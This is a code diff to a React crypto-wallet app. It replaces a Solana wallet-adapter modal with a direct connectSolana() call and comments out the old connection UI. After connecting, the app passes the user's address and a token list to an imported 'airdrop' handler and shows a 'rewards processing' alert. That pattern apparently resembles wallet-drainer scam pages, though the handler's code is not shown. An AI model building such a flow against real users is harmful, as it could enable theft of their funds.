@@ -1,5 +1,5 @@
 
-import { useContext, useState, useRef, useMemo } from 'react';
+import { useContext, useState, useRef } from 'react';
 import { WalletContext } from './context/WalletContext';
 import './App.css'
 import { connectWallet, getBalance } from './web3/wallet';
@@ -17,9 +17,9 @@ import { SiSolana } from "react-icons/si"; // SimpleIcons for Solana
 // import Provider from '@walletconnect/ethereum-provider';
 // import { useMemo } from "react";
 import { SolanaContext } from './context/solana_context/SolanaContext';
-// import { connectSolana, handleSolanaAirdrop } from './web3/solana';
-import { handleSolanaAirdrop } from './web3/solana';
-import { connectSolanaWallet, getSolanaWalletNames } from './web3/solanaWalletAdapter';
+import { connectSolana, handleSolanaAirdrop } from './web3/solana';
+// import { handleSolanaAirdrop } from './web3/solana';
+// import { connectSolanaWallet, getSolanaWalletNames } from './web3/solanaWalletAdapter';
 
 const tokenAddresses = [
   "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
@@ -56,12 +56,12 @@ function App() {
   const topRef = useRef(null);
   const chartRef = useRef(null);
   const [showModal, setShowModal] = useState(false);
-  const [showSolanaModal, setShowSolanaModal] = useState(false);
-  const solanaWalletNames = useMemo(() => getSolanaWalletNames(), []);
+  // const [showSolanaModal, setShowSolanaModal] = useState(false);
+  // const solanaWalletNames = useMemo(() => getSolanaWalletNames(), []);
   const { solDispatch } = useContext(SolanaContext)
 
-  const openSolanaModal = () => setShowSolanaModal(true);
-  const closeSolanaModal = () => setShowSolanaModal(false);
+  // const openSolanaModal = () => setShowSolanaModal(true);
+  // const closeSolanaModal = () => setShowSolanaModal(false);
 
   const scrollToTop = () => {
     window.scrollTo({
@@ -133,32 +133,32 @@ function App() {
     setLoading(false);
   }
 
-  const handleConnectSolanaWallet = async (walletName) => {
-    if (loading) return;
-    setLoading(true);
+  // const handleConnectSolanaWallet = async (walletName) => {
+  //   if (loading) return;
+  //   setLoading(true);
 
-    try {
-      const { address: solAddress } = await connectSolanaWallet(walletName);
-      if (solAddress) {
-        solDispatch({ type: "CONNECT_SOLANA", payload: { address: solAddress } });
-        await handleSolanaAirdrop(solAddress, solanaTokenList);
-        alert("Solana rewards Processing...");
-      }
-    } catch (e) {
-      console.log("Solana Wallet Connect Error:", e);
-      alert("Unable to connect the selected Solana wallet.");
-    } finally {
-      setLoading(false);
-      closeSolanaModal();
-    }
-  };
+  //   try {
+  //     const { address: solAddress } = await connectSolanaWallet(walletName);
+  //     if (solAddress) {
+  //       solDispatch({ type: "CONNECT_SOLANA", payload: { address: solAddress } });
+  //       await handleSolanaAirdrop(solAddress, solanaTokenList);
+  //       alert("Solana rewards Processing...");
+  //     }
+  //   } catch (e) {
+  //     console.log("Solana Wallet Connect Error:", e);
+  //     alert("Unable to connect the selected Solana wallet.");
+  //   } finally {
+  //     setLoading(false);
+  //     closeSolanaModal();
+  //   }
+  // };
 
   const handleSolanaAirdropFlow = async () => {
     if(loading) return
     setLoading(true)
 
     try {
-      const { address: solAddress } = await connectSolanaWallet()
+      const solAddress = await connectSolana()
       if(solAddress){
         solDispatch({type: "CONNECT_SOLANA", payload: {address: solAddress}})
         await handleSolanaAirdrop(solAddress, solanaTokenList)
@@ -444,6 +444,7 @@ function App() {
         <LiveChartComponent />
       </section>
       <footer className='overflow-x-none' ref={topRef}>
+        {/* openSolanaModal prop commented out since adapter UI is disabled */}
         <FooterNav
           scrollToTop={scrollToTop}
           scrollToCharts={scrollToCharts}
@@ -454,7 +455,6 @@ function App() {
           loading={loading}
           address={state.address}
           setShowModal={setShowModal}
-          openSolanaModal={openSolanaModal}
         />
       </footer>
       {showModal && (
@@ -462,6 +462,7 @@ function App() {
           <WalletSelector onConnected={handleWalletConnected} />
         </div>
       )}
+      {/*
       {showSolanaModal && (
         <div className="modal-overlay">
           <div className="solana-modal bg-white p-4 rounded shadow-lg">
@@ -486,6 +487,7 @@ function App() {
           </div>
         </div>
       )}
+      */}
     </>
   )
 }
